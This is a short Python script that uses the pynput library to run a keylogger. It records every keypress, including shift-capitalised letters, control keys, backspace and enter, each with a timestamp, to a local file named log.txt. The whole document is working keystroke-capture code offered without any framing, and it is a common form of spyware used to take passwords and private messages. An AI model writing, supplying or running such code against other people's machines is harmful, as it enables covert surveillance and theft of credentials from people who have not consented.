from pynput.keyboard import Listener, Key
import datetime

# Keep track of shift state for capturing capital letters
shift_pressed = False

def write_to_file(key):
    global shift_pressed
    letter = str(key).replace("'", "")  # Remove default quotes for better readability
    
    # Add timestamp
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Handle special keys
    if letter == 'Key.space':
        letter = ' '
    elif letter in ['Key.shift', 'Key.shift_r']:
        shift_pressed = True
        return
    elif letter in ['Key.ctrl_l', 'Key.ctrl_r']:
        letter = '[CTRL]'
    elif letter in ['Key.alt_l', 'Key.alt_r']:
        letter = '[ALT]'
    elif letter == 'Key.backspace':
        letter = '<.<'  # Indicating backspace
    elif letter == 'Key.enter':
        letter = '\n'  # New line for enter key
    
    # Capitalize letters if SHIFT is pressed
    if shift_pressed and letter.isalpha():
        letter = letter.upper()
        shift_pressed = False  # Reset shift state
    
    # Log key with timestamp
    with open("log.txt", 'a') as f:
        f.write(f"[{timestamp}] {letter}")
    
# Start the listener
with Listener(on_press=write_to_file) as l:
    l.join()
